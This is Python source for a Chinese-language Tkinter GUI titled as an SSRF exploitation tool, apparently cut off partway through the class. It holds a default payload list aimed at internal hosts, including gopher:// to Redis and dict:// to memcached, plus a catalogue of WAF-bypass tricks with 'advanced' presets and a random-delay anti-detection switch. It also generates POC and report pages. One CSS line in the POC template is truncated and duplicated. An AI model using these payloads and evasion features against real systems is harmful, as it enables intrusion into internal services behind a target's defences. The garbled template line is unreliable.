import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import requests
import re
import time
import random
from datetime import datetime
import json
import os
import urllib.parse
from urllib.parse import urlparse, urlencode, parse_qs
import threading
from queue import Queue
import webbrowser
import zipfile
import shutil
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning

# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SSRFExploitTool:
    def __init__(self, root):
        self.root = root
        self.root.title("SSRF漏洞利用工具1.1")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # 设置中文字体支持
        self.setup_fonts()
        
        # 确保报告和POC目录存在
        self.ensure_directory("reports")
        self.ensure_directory("pocs")
        
        # 线程安全控制
        self.testing_in_progress = False
        self.stop_testing = False
        self.queue = Queue()
        self.threads = []
        
        # 内置参数列表
        self.built_in_parameters = [
            "url", "uri", "path", "file", "page", "link", "redirect", 
            "target", "dest", "destination", "remote", "fetch", "load",
            "data", "source", "import", "include", "resource", "ref"
        ]
        
        # 绕过WAF的技术
        self.waf_bypass_techniques = {
            "随机参数混淆": {
                "enabled": True,
                "description": "添加随机参数来混淆WAF规则"
            },
            "大小写转换": {
                "enabled": True,
                "description": "随机改变Payload的大小写"
            },
            "空字节注入": {
                "enabled": True,
                "description": "添加空字节和控制字符"
            },
            "斜线变体": {
                "enabled": False,
                "description": "添加额外或变体的斜线"
            },
            "URL编码": {
                "enabled": True,
                "description": "对Payload进行URL编码"
            },
            "伪造子域名": {
                "enabled": False,
                "description": "添加伪造的子域名"
            },
            "IPv6转换": {
                "enabled": True,
                "description": "将IPv4地址转换为IPv6变体"
            },
            "协议变体": {
                "enabled": True,
                "description": "尝试不同的协议变体"
            },
            "Unicode编码": {
                "enabled": True,
                "description": "使用Unicode编码绕过检测"
            },
            "注释混淆": {
                "enabled": True,
                "description": "添加注释来混淆WAF规则"
            }
        }
        
        # 预设SSRF Payloads
        self.ssrf_payloads = self.load_default_payloads()
        
        # 漏洞信息存储
        self.vulnerabilities = []
        
        # 设置UI
        self.setup_ui()
    
    def setup_fonts(self):
        """设置字体支持中文显示"""
        self.style = ttk.Style()
        self.style.configure(".", font=("SimHei", 9))
        self.style.configure("Header.TLabel", font=("SimHei", 10, "bold"))
        self.style.configure("TButton", font=("SimHei", 9))
        self.style.configure("TNotebook.Tab", font=("SimHei", 9))
    
    def ensure_directory(self, dir_name):
        """确保目录存在"""
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
    
    def load_default_payloads(self):
        """加载默认的SSRF Payloads"""
        return [
            # 基础本地地址
            "http://127.0.0.1",
            "http://localhost",
            # 绕过localhost过滤
            "http://0",
            "http://0.0.0.0",
            "http://[::1]",
            # 十进制IP
            "http://2130706433",  # 127.0.0.1
            "http://3232235521",  # 192.168.0.1
            # 特殊域名
            "http://localhost.localdomain",
            # URL编码
            "http://%73%73%72%66%2e%65%78%61%6d%70%6c%65%2e%63%6f%6d",
            # 端口混淆
            "http://127.0.0.1:8080",
            "http://127.0.0.1:443",
            # @符号利用
            "http://example.com@127.0.0.1",
            # 其他协议
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:11211/stat",
            "ftp://127.0.0.1"
        ]
    
    def setup_ui(self):
        """设置用户界面"""
        # 创建主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 顶部状态栏
        status_frame = ttk.Frame(main_frame, height=30)
        status_frame.pack(fill=tk.X, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="就绪", foreground="green")
        self.status_label.pack(side=tk.RIGHT)
        
        # 创建标签页控制器
        self.tab_control = ttk.Notebook(main_frame)
        
        # 创建各个标签页
        self.test_tab = ttk.Frame(self.tab_control)
        self.waf_tab = ttk.Frame(self.tab_control)
        self.results_tab = ttk.Frame(self.tab_control)
        self.report_tab = ttk.Frame(self.tab_control)
        
        # 添加标签页
        self.tab_control.add(self.test_tab, text="漏洞测试")
        self.tab_control.add(self.waf_tab, text="WAF绕过设置")
        self.tab_control.add(self.results_tab, text="测试结果")
        self.tab_control.add(self.report_tab, text="报告与下载")
        
        self.tab_control.pack(expand=1, fill="both")
        
        # 设置各个标签页内容
        self.setup_test_tab()
        self.setup_waf_tab()
        self.setup_results_tab()
        self.setup_report_tab()
    
    def setup_test_tab(self):
        """设置漏洞测试标签页"""
        # 主框架
        main_frame = ttk.Frame(self.test_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 目标URL设置
        url_frame = ttk.LabelFrame(main_frame, text="目标设置", padding="10")
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="目标URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.target_url = ttk.Entry(url_frame, width=80)
        self.target_url.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        ttk.Button(url_frame, text="提取参数", command=self.extract_parameters).grid(row=0, column=2, padx=5)
        
        # 参数选择区域
        param_frame = ttk.LabelFrame(main_frame, text="参数选择", padding="10")
        param_frame.pack(fill=tk.X, pady=5)
        
        # 参数来源选择
        self.param_source = tk.StringVar(value="built_in")
        ttk.Radiobutton(param_frame, text="内置参数", variable=self.param_source, value="built_in",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(param_frame, text="URL参数", variable=self.param_source, value="url",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(param_frame, text="自定义参数", variable=self.param_source, value="custom",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        
        ttk.Label(param_frame, text="测试参数:").pack(side=tk.LEFT, padx=10)
        
        # 参数选择下拉框
        self.param_var = tk.StringVar()
        self.param_combobox = ttk.Combobox(param_frame, textvariable=self.param_var, width=25)
        self.param_combobox.pack(side=tk.LEFT, padx=5)
        
        # 自定义参数输入框
        self.custom_param = ttk.Entry(param_frame, width=20)
        self.custom_param.pack(side=tk.LEFT, padx=5)
        self.custom_param.bind("<FocusOut>", lambda e: self.add_custom_parameter())
        
        # 初始化URL参数列表
        self.url_parameters = []
        self.update_param_list()
        
        # 测试配置
        config_frame = ttk.LabelFrame(main_frame, text="测试配置", padding="10")
        config_frame.pack(fill=tk.X, pady=5)
        
        # 左侧配置
        left_config = ttk.Frame(config_frame)
        left_config.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # 超时设置
        ttk.Label(left_config, text="超时时间(秒):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.timeout = ttk.Entry(left_config, width=10)
        self.timeout.insert(0, "10")
        self.timeout.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        # 线程数
        ttk.Label(left_config, text="线程数:").grid(row=0, column=2, sticky=tk.W, pady=2)
        self.thread_count = ttk.Entry(left_config, width=10)
        self.thread_count.insert(0, "5")
        self.thread_count.grid(row=0, column=3, sticky=tk.W, pady=2, padx=5)
        
        # 右侧配置
        right_config = ttk.Frame(config_frame)
        right_config.pack(side=tk.RIGHT, fill=tk.X, expand=True)
        
        # 代理设置
        ttk.Label(right_config, text="代理(可选):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.proxy = ttk.Entry(right_config, width=40)
        self.proxy.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        # 测试选项
        options_frame = ttk.Frame(config_frame)
        options_frame.pack(fill=tk.X, pady=5)
        
        self.intensive_mode = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="深度测试模式", variable=self.intensive_mode).pack(side=tk.LEFT, padx=10)
        
        self.random_delay = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="随机延迟(防检测)", variable=self.random_delay).pack(side=tk.LEFT, padx=10)
        
        ttk.Button(options_frame, text="WAF绕过设置", 
                  command=lambda: self.tab_control.select(1)).pack(side=tk.RIGHT, padx=10)
        
        # Payload区域
        payload_frame = ttk.LabelFrame(main_frame, text="Payload设置", padding="10")
        payload_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        payload_controls = ttk.Frame(payload_frame)
        payload_controls.pack(fill=tk.X)
        
        ttk.Label(payload_controls, text="测试Payload列表(每行一个):").pack(side=tk.LEFT)
        ttk.Button(payload_controls, text="加载", command=self.load_payloads).pack(side=tk.RIGHT, padx=2)
        ttk.Button(payload_controls, text="保存", command=self.save_payloads).pack(side=tk.RIGHT, padx=2)
        ttk.Button(payload_controls, text="重置", command=self.reset_payloads).pack(side=tk.RIGHT, padx=2)
        
        self.payload_text = scrolledtext.ScrolledText(payload_frame, height=8)
        self.payload_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # 加载默认payloads
        for payload in self.ssrf_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        
        # 按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="开始测试", command=self.start_testing)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = ttk.Button(button_frame, text="停止测试", command=self.stop_testing_action, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        ttk.Button(button_frame, text="清空配置", command=self.clear_test_config).pack(side=tk.RIGHT, padx=10)
    
    def setup_waf_tab(self):
        """设置WAF绕过设置标签页（独立页面）"""
        main_frame = ttk.Frame(self.waf_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 标题和说明
        ttk.Label(main_frame, text="WAF绕过技术配置", font=("SimHei", 12, "bold")).pack(anchor=tk.W, pady=10)
        ttk.Label(
            main_frame, 
            text="选择要应用的WAF绕过技术，勾选的技术将在测试中随机组合使用。\n"
                 "建议根据目标系统特点选择合适的绕过技术组合。"
        ).pack(anchor=tk.W, pady=5)
        
        # 技术列表框架
        techniques_frame = ttk.LabelFrame(main_frame, text="绕过技术", padding="10")
        techniques_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # 创建技术复选框
        self.waf_checkbuttons = {}
        row = 0
        col = 0
        
        for tech_name, tech_info in self.waf_bypass_techniques.items():
            var = tk.BooleanVar(value=tech_info["enabled"])
            cb = ttk.Checkbutton(
                techniques_frame, 
                text=tech_name, 
                variable=var
            )
            cb.grid(row=row, column=col, sticky=tk.W, padx=15, pady=8)
            
            # 添加描述标签
            desc_label = ttk.Label(
                techniques_frame, 
                text=tech_info["description"], 
                font=("SimHei", 8),
                foreground="#666666"
            )
            desc_label.grid(row=row+1, column=col, sticky=tk.W, padx=20, pady=0)
            
            self.waf_checkbuttons[tech_name] = var
            
            # 布局控制
            col += 1
            if col >= 2:
                col = 0
                row += 2
        
        # 预设级别
        preset_frame = ttk.LabelFrame(main_frame, text="预设级别", padding="10")
        preset_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(preset_frame, text="基础绕过", command=self.apply_basic_bypass).pack(side=tk.LEFT, padx=15)
        ttk.Button(preset_frame, text="中级绕过", command=self.apply_medium_bypass).pack(side=tk.LEFT, padx=15)
        ttk.Button(preset_frame, text="高级绕过", command=self.apply_advanced_bypass).pack(side=tk.LEFT, padx=15)
        
        # 提示信息
        ttk.Label(
            main_frame, 
            text="提示：过多的绕过技术组合可能导致测试效率下降，建议根据目标系统调整。",
            font=("SimHei", 9),
            foreground="#FF6600"
        ).pack(anchor=tk.W, pady=10)
    
    def setup_results_tab(self):
        """设置测试结果标签页"""
        main_frame = ttk.Frame(self.results_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 结果控制区
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(control_frame, text="漏洞筛选:").pack(side=tk.LEFT, padx=5)
        self.vuln_filter = tk.StringVar(value="全部")
        filter_combo = ttk.Combobox(control_frame, textvariable=self.vuln_filter, 
                                   values=["全部", "高风险", "中风险", "低风险"], width=10)
        filter_combo.pack(side=tk.LEFT, padx=5)
        filter_combo.bind("<<ComboboxSelected>>", self.filter_vulnerabilities)
        
        ttk.Button(control_frame, text="生成POC", command=self.generate_and_download_poc).pack(side=tk.RIGHT, padx=5)
        ttk.Button(control_frame, text="生成报告", command=self.generate_and_download_report).pack(side=tk.RIGHT, padx=5)
        
        # 漏洞列表
        ttk.Label(main_frame, text="发现的漏洞:").pack(anchor=tk.W, pady=2)
        self.vuln_tree = ttk.Treeview(main_frame, columns=("id", "url", "param", "payload", "severity"), show="headings")
        self.vuln_tree.heading("id", text="ID")
        self.vuln_tree.heading("url", text="URL")
        self.vuln_tree.heading("param", text="参数")
        self.vuln_tree.heading("payload", text="Payload")
        self.vuln_tree.heading("severity", text="风险等级")
        
        self.vuln_tree.column("id", width=50)
        self.vuln_tree.column("url", width=300)
        self.vuln_tree.column("param", width=100)
        self.vuln_tree.column("payload", width=250)
        self.vuln_tree.column("severity", width=80)
        
        # 添加滚动条
        tree_scroll = ttk.Scrollbar(main_frame, orient="vertical", command=self.vuln_tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.vuln_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.vuln_tree.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # 结果详情
        ttk.Label(main_frame, text="漏洞详情:").pack(anchor=tk.W, pady=2)
        self.result_text = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, height=10)
        self.result_text.pack(fill=tk.BOTH, expand=True)
        self.result_text.tag_config("success", foreground="#008000")
        self.result_text.tag_config("error", foreground="#ff0000")
        self.result_text.tag_config("info", foreground="#0000ff")
        self.result_text.tag_config("warning", foreground="#ffA500")
        
        # 绑定树视图选择事件
        self.vuln_tree.bind("<<TreeviewSelect>>", self.show_vuln_details)
    
    def setup_report_tab(self):
        """设置报告与下载标签页"""
        main_frame = ttk.Frame(self.report_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 下载路径设置
        path_frame = ttk.LabelFrame(main_frame, text="下载设置", padding="10")
        path_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(path_frame, text="下载路径:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.download_path = ttk.Entry(path_frame, width=60)
        self.download_path.grid(row=0, column=1, pady=5, padx=5)
        self.download_path.insert(0, os.path.abspath("."))
        ttk.Button(path_frame, text="浏览...", 
                  command=lambda: self.choose_download_path()).grid(row=0, column=2, padx=5)
        
        # 批量操作区域
        batch_frame = ttk.LabelFrame(main_frame, text="批量操作", padding="10")
        batch_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(batch_frame, text="下载所有POC", command=self.batch_download_pocs).pack(side=tk.LEFT, padx=15, pady=5)
        ttk.Button(batch_frame, text="下载完整报告", command=self.generate_complete_report).pack(side=tk.LEFT, padx=15, pady=5)
        ttk.Button(batch_frame, text="打包下载全部", command=self.package_all_downloads).pack(side=tk.LEFT, padx=15, pady=5)
        
        # 历史记录区域
        history_frame = ttk.LabelFrame(main_frame, text="下载历史", padding="10")
        history_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # 创建历史记录树视图
        self.download_history = ttk.Treeview(history_frame, columns=("name", "type", "path", "date"), show="headings")
        self.download_history.heading("name", text="文件名")
        self.download_history.heading("type", text="类型")
        self.download_history.heading("path", text="保存路径")
        self.download_history.heading("date", text="下载时间")
        
        self.download_history.column("name", width=200)
        self.download_history.column("type", width=80)
        self.download_history.column("path", width=400)
        self.download_history.column("date", width=150)
        
        # 添加滚动条
        history_scroll = ttk.Scrollbar(history_frame, orient="vertical", command=self.download_history.yview)
        history_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.download_history.configure(yscrollcommand=history_scroll.set)
        
        self.download_history.pack(fill=tk.BOTH, expand=True)
        
        # 历史记录控制按钮
        history_controls = ttk.Frame(history_frame)
        history_controls.pack(fill=tk.X, pady=5)
        
        ttk.Button(history_controls, text="打开文件", command=self.open_downloaded_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(history_controls, text="打开文件夹", command=self.open_download_folder).pack(side=tk.LEFT, padx=5)
        ttk.Button(history_controls, text="清空历史", command=self.clear_download_history).pack(side=tk.RIGHT, padx=5)
        
        # 初始化下载历史列表
        self.download_records = []
    
    # UI事件处理函数
    def update_param_list(self):
        """根据选择的参数来源更新参数列表"""
        source = self.param_source.get()
        
        if source == "built_in":
            # 内置参数
            self.param_combobox['values'] = self.built_in_parameters
            self.param_combobox.config(state="readonly")
            self.custom_param.config(state="disabled")
            if self.built_in_parameters:
                self.param_combobox.current(0)
        elif source == "url":
            # URL参数
            self.param_combobox['values'] = self.url_parameters
            self.param_combobox.config(state="readonly")
            self.custom_param.config(state="disabled")
            if self.url_parameters:
                self.param_combobox.current(0)
            else:
                self.param_var.set("")
                messagebox.showinfo("信息", "未从URL中提取到参数，请先输入URL并点击提取参数")
        elif source == "custom":
            # 自定义参数
            self.param_combobox['values'] = []
            self.param_combobox.config(state="disabled")
            self.custom_param.config(state="normal")
    
    def extract_parameters(self):
        """从URL中提取参数"""
        url = self.target_url.get().strip()
        if not url:
            messagebox.showwarning("警告", "请输入目标URL")
            return
            
        if not re.match(r"^https?://", url):
            url = f"http://{url}"
            
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                self.url_parameters = list(query_params.keys())
                self.param_source.set("url")
                self.update_param_list()
                self.log(f"从URL中提取到 {len(self.url_parameters)} 个参数", "info")
            else:
                messagebox.showinfo("信息", "URL中未发现参数，您可以使用内置参数或自定义参数")
        except Exception as e:
            self.log(f"提取参数失败: {str(e)}", "error")
    
    def add_custom_parameter(self):
        """添加自定义参数"""
        param_name = self.custom_param.get().strip()
        if param_name and self.param_source.get() == "custom":
            self.param_var.set(param_name)
    
    def load_payloads(self):
        """从文件加载payloads"""
        file_path = filedialog.askopenfilename(filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")])
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    payloads = f.readlines()
                    self.payload_text.delete(1.0, tk.END)
                    for payload in payloads:
                        self.payload_text.insert(tk.END, payload.strip() + "\n")
                self.log(f"已从文件加载 {len(payloads)} 个payload", "info")
            except Exception as e:
                self.log(f"加载payload文件失败: {str(e)}", "error")
    
    def save_payloads(self):
        """保存payloads到文件"""
        payloads = [p.strip() for p in self.payload_text.get(1.0, tk.END).splitlines() if p.strip()]
        if not payloads:
            messagebox.showwarning("警告", "没有payload可保存")
            return
            
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")])
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(payloads))
                self.log(f"Payload已保存到 {file_path}", "info")
            except Exception as e:
                self.log(f"保存payload失败: {str(e)}", "error")
    
    def reset_payloads(self):
        """重置payload到默认值"""
        self.payload_text.delete(1.0, tk.END)
        for payload in self.ssrf_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        self.log("已重置为默认payload", "info")
    
    def clear_test_config(self):
        """清空测试配置"""
        if self.testing_in_progress:
            messagebox.showwarning("警告", "测试正在进行中，无法清空配置")
            return
            
        self.target_url.delete(0, tk.END)
        self.proxy.delete(0, tk.END)
        self.payload_text.delete(1.0, tk.END)
        for payload in self.ssrf_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        self.param_source.set("built_in")
        self.update_param_list()
        self.intensive_mode.set(False)
        self.random_delay.set(True)
        self.log("已清空测试配置", "info")
    
    def log(self, message, tag="info"):
        """在结果区域显示日志信息"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.result_text.insert(tk.END, f"[{timestamp}] {message}\n", tag)
        self.result_text.see(tk.END)
        self.root.update_idletasks()
    
    # WAF绕过策略
    def apply_basic_bypass(self):
        """应用基础绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(tech_name in [
                "随机参数混淆", "大小写转换", "URL编码"
            ])
    
    def apply_medium_bypass(self):
        """应用中级绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(tech_name in [
                "随机参数混淆", "大小写转换", "空字节注入", 
                "URL编码", "IPv6转换", "协议变体"
            ])
    
    def apply_advanced_bypass(self):
        """应用高级绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(True)
    
    # 下载相关功能
    def choose_download_path(self):
        """选择下载路径"""
        path = filedialog.askdirectory(title="选择下载路径")
        if path:
            self.download_path.delete(0, tk.END)
            self.download_path.insert(0, path)
    
    def add_to_download_history(self, filename, file_type, path):
        """添加到下载历史"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.download_records.append({
            "name": filename,
            "type": file_type,
            "path": path,
            "date": timestamp
        })
        
        # 更新历史记录树视图
        self.download_history.insert("", tk.END, values=(filename, file_type, path, timestamp))
        
        # 限制历史记录数量
        if len(self.download_records) > 50:
            self.download_records.pop(0)
            oldest_item = self.download_history.get_children()[0]
            self.download_history.delete(oldest_item)
    
    def open_downloaded_file(self):
        """打开选中的下载文件"""
        selected_items = self.download_history.selection()
        if not selected_items:
            messagebox.showwarning("警告", "请先选择一个文件")
            return
            
        item = selected_items[0]
        file_path = self.download_history.item(item, "values")[2]
        
        if os.path.exists(file_path):
            webbrowser.open(f"file://{os.path.abspath(file_path)}")
        else:
            messagebox.showerror("错误", "文件不存在或已被移动")
            # 从历史记录中移除
            self.download_history.delete(item)
    
    def open_download_folder(self):
        """打开下载文件夹"""
        selected_items = self.download_history.selection()
        if not selected_items:
            messagebox.showwarning("警告", "请先选择一个文件")
            return
            
        item = selected_items[0]
        file_path = self.download_history.item(item, "values")[2]
        folder_path = os.path.dirname(file_path)
        
        if os.path.exists(folder_path):
            webbrowser.open(f"file://{os.path.abspath(folder_path)}")
        else:
            messagebox.showerror("错误", "文件夹不存在")
    
    def clear_download_history(self):
        """清空下载历史"""
        if messagebox.askyesno("确认", "确定要清空下载历史吗?"):
            for item in self.download_history.get_children():
                self.download_history.delete(item)
            self.download_records = []
    
    # 漏洞结果处理
    def get_current_param(self):
        """获取当前选择的参数"""
        source = self.param_source.get()
        if source == "custom":
            return self.custom_param.get().strip()
        return self.param_var.get().strip()
    
    def get_vulnerability_severity(self, vuln):
        """评估漏洞严重程度"""
        payload = vuln['payload']
        if any(protocol in payload for protocol in ["gopher", "dict", "ldap", "ftp", "sftp"]):
            return "高风险"
        if any(pattern in payload for pattern in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]"]):
            return "中风险"
        return "低风险"
    
    def update_vulnerability_list(self):
        """更新漏洞列表"""
        # 清空现有列表
        for item in self.vuln_tree.get_children():
            self.vuln_tree.delete(item)
        
        # 添加漏洞到列表
        for vuln in self.vulnerabilities:
            severity = self.get_vulnerability_severity(vuln)
            self.vuln_tree.insert("", tk.END, values=(
                vuln['id'], 
                vuln['url'].split('?')[0], 
                self.get_current_param(),
                vuln['payload'],
                severity
            ))
    
    def filter_vulnerabilities(self, event):
        """筛选漏洞列表"""
        filter_text = self.vuln_filter.get()
        
        # 清空现有列表
        for item in self.vuln_tree.get_children():
            self.vuln_tree.delete(item)
        
        # 添加符合条件的漏洞
        for vuln in self.vulnerabilities:
            severity = self.get_vulnerability_severity(vuln)
            if filter_text == "全部" or severity == filter_text:
                self.vuln_tree.insert("", tk.END, values=(
                    vuln['id'], 
                    vuln['url'].split('?')[0], 
                    self.get_current_param(),
                    vuln['payload'],
                    severity
                ))
    
    def show_vuln_details(self, event):
        """显示选中漏洞的详情"""
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            return
            
        item = selected_items[0]
        vuln_id = int(self.vuln_tree.item(item, "values")[0])
        
        # 查找对应的漏洞信息
        for vuln in self.vulnerabilities:
            if vuln['id'] == vuln_id:
                # 显示漏洞详情
                details = f"漏洞 ID: {vuln['id']}\n"
                details += f"目标 URL: {vuln['url']}\n"
                details += f"测试参数: {self.get_current_param()}\n"
                details += f"Payload: {vuln['payload']}\n"
                details += f"状态码: {vuln['status_code']}\n"
                details += f"响应时间: {vuln['response_time']:.2f}秒\n"
                details += f"漏洞类型: {vuln['type']}\n"
                details += f"风险等级: {self.get_vulnerability_severity(vuln)}\n\n"
                details += f"描述: {vuln['description']}\n"
                
                self.result_text.delete(1.0, tk.END)
                self.result_text.insert(tk.END, details)
                return
    
    # POC和报告生成
    def generate_and_download_poc(self):
        """生成POC并下载到指定路径"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成POC")
            return
            
        # 获取选中的漏洞
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            # 如果没有选中，让用户选择
            vuln_ids = [str(v['id']) for v in self.vulnerabilities]
            selected_id = simpledialog.askinteger(
                "选择漏洞", 
                f"请选择要生成POC的漏洞ID (1-{len(self.vulnerabilities)}):",
                minvalue=1, 
                maxvalue=len(self.vulnerabilities)
            )
            
            if not selected_id:
                return
                
            vuln = self.vulnerabilities[selected_id - 1]
        else:
            # 使用选中的漏洞
            item = selected_items[0]
            vuln_id = int(self.vuln_tree.item(item, "values")[0])
            vuln = next(v for v in self.vulnerabilities if v['id'] == vuln_id)
        
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "pocs"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"ssrf_poc_{vuln['id']}_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建POC内容
        poc_content = self.generate_poc_content(vuln)
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(poc_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "POC", file_path)
            
            self.log(f"POC已下载到: {file_path}", "success")
            
            # 询问是否打开POC文件
            if messagebox.askyesno("POC生成成功", f"POC已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成POC失败: {str(e)}", "error")
    
    def generate_poc_content(self, vuln):
        """生成POC内容"""
        severity = self.get_vulnerability_severity(vuln)
        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SSRF漏洞POC - {vuln['id']}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; }}
        .poc-box {{ border: 1px solid #ccc; padding: 1
        .poc-box {{ border: 1px solid #ccc; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .payload {{ background-color: #f5f5f5; padding: 10px; font-family: monospace; word-break: break-all; }}
        .button {{ background-color: #4CAF50; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; }}
        .button:hover {{ background-color: #45a049; }}
        .severity {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.9em; font-weight: bold; margin-left: 10px; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
    </style>
</head>
<body>
    <h1>SSRF漏洞POC验证报告</h1>
    <div class="poc-box">
        <h2>漏洞信息 <span class="severity {severity.replace('风险', '').lower()}">{severity}</span></h2>
        <p><strong>ID:</strong> {vuln['id']}</p>
        <p><strong>目标URL:</strong> {vuln['url'].split('?')[0]}</p>
        <p><strong>参数:</strong> {self.get_current_param()}</p>
        <p><strong>状态码:</strong> {vuln['status_code']}</p>
        <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
        <p><strong>漏洞类型:</strong> {vuln['type']}</p>
    </div>
    
    <div class="poc-box">
        <h2>POC验证</h2>
        <p><strong>利用Payload:</strong></p>
        <div class="payload">{vuln['payload']}</div>
        
        <p><strong>完整URL:</strong></p>
        <div class="payload">{vuln['url']}</div>
        
        <p><button class="button" onclick="window.open('{vuln['url']}')">打开测试URL</button></p>
    </div>
    
    <div class="poc-box">
        <h2>漏洞描述</h2>
        <p>{vuln['description']}</p>
        
        <h2>修复建议</h2>
        <ul>
            <li>实施严格的URL验证和白名单机制</li>
            <li>禁止请求内网地址和敏感服务</li>
            <li>限制可使用的协议（如禁止gopher、dict等）</li>
            <li>对请求的响应进行严格检查</li>
        </ul>
    </div>
</body>
</html>"""
    
    def generate_and_download_report(self):
        """生成SRC漏洞报告并下载到指定路径"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成报告")
            return
            
        # 获取选中的漏洞
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            # 如果没有选中，生成所有漏洞的报告
            self.generate_complete_report()
            return
            
        # 使用选中的漏洞生成单个漏洞报告
        item = selected_items[0]
        vuln_id = int(self.vuln_tree.item(item, "values")[0])
        vuln = next(v for v in self.vulnerabilities if v['id'] == vuln_id)
        
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "reports"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"ssrf_report_{vuln['id']}_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建报告内容
        report_content = self.generate_single_vuln_report(vuln)
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "报告", file_path)
            
            self.log(f"SRC漏洞报告已下载到: {file_path}", "success")
            
            # 询问是否打开报告文件
            if messagebox.askyesno("报告生成成功", f"报告已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成报告失败: {str(e)}", "error")
    
